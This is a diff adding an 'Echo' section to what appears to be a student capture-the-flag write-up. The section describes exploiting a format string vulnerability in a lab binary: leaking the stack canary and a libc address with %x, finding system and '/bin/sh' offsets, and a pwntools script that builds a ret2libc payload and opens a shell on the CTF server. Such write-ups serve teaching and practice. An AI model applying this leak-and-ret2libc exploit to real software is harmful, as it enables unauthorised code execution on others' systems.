@@ -218,3 +218,94 @@ tiagobarbosa05@MacBook-Pro-de-Tiago-2 Downloads % python3 challenge.py
 32672
 b'flag{e5ec82bc1c3824aaa7a276ed9ffce076}\n'
 ```
+
+## Echo
+
+> We were once more handed a binary executable for this task. This straightforward program requests for input frequently. We further examined it and found a string format vulnerability that we might take advantage of. As a result, we were able to analyze the stack by using %x.
+>
+> However, after reviewing the security protections in place, we determined that performing a typical buffer overflow attack would be impossible since the stack had DEP protection.We thus considered it logical to attempt to employ ROP to exploit the software.
+>
+```shell
+gdb-peda$ checksec
+CANARY    : ENABLED
+FORTIFY   : disabled
+NX        : ENABLED
+PIE       : disabled
+RELRO     : FULL
+```
+
+> The plan was to obtain a shell by having the software execute "system" with the shell parameter. We would require the following for this to succeed:
+
+- The base address for "libc."
+- The libc's "system" and "/bin/sh" addresses.
+- Discover a means to get past the canary protection.
+
+> We require the base address of libc in order to access its functions. This work becomes a little more difficult since the address space is randomized. However, we may use the program's ability to accept many inputs to our advantage in order to gather data.
+>
+> We anticipate the ESP to maintain a relative position to other components of the stack, especially the libc base address, despite the fact that the address space is random. In this manner, we determined the offset for a program execution and utilized that number to arrive at the real libc location.
+>
+> We took the following actions to obtain the system function address:
+
+```bash
+$ objdump -T libc.so.6 | grep "system"
+00163690 g    DF .text	0000006a (GLIBC_2.0)  svcerr_systemerr
+00048150  w   DF .text	0000003f  GLIBC_2.0   system
+00048150 g    DF .text	0000003f  GLIBC_PRIVATE __libc_system
+```
+
+> Afterward, to obtain '/bin/sh' on libc:
+
+```bash
+$ strings -a -t x libc.so.6 | grep "/bin/sh"
+ 1bd0f5 /bin/sh
+```
+
+> As a result, we now know that system and the shell have offsets of 0x48150 and 0x1bd0f5, respectively.
+>
+> We are aware that the program's stack is secured by a canary thanks to "checksec". We are aware that the canary will be in position 8 on the stack thanks to the previous stack analysis. Therefore, all that is required of us is to include it in the payload and leak it using the format vulnerability.
+
+> After calculating all of these numbers, we developed the following attack to obtain the flag: 
+
+```py
+#!/usr/bin/python3
+from pwn import *
+  
+p = remote("ctf-fsi.fe.up.pt", 4002)
+
+libc_offset = 136473
+
+system_offset = 0x00048150
+shell_offset = 0x1bd0f5
+
+def send(p, msg):
+	p.recvuntil(b">")
+	p.sendline(b"e")
+	p.recvuntil(b"chars): ")
+	p.sendline(msg)
+	line = p.recvline()
+	p.recvuntil(b"message: ")
+	p.sendline(b"")
+	return line
+	
+values = send(p, b"%8$x %11$x") 
+
+canary, ref = [int(x, 16) for x in values.split()]
+
+libc = ref - libc_offset   #get base libc
+system = libc + system_offset
+shell = libc + shell_offset
+
+content = bytearray(0x90 for i in range(80))
+content[20:24]  =  (canary + 1).to_bytes(4, byteorder='little')
+content[32:36]  =  (system).to_bytes(4, byteorder='little')
+content[40:44]  =  (shell).to_bytes(4, byteorder='little')
+
+send(p, content)
+
+content = bytearray(0x90 for i in range(19))
+send(p, content)
+
+p.interactive()
+```
+
+> After this we got access to a shell and successfully got the flag.
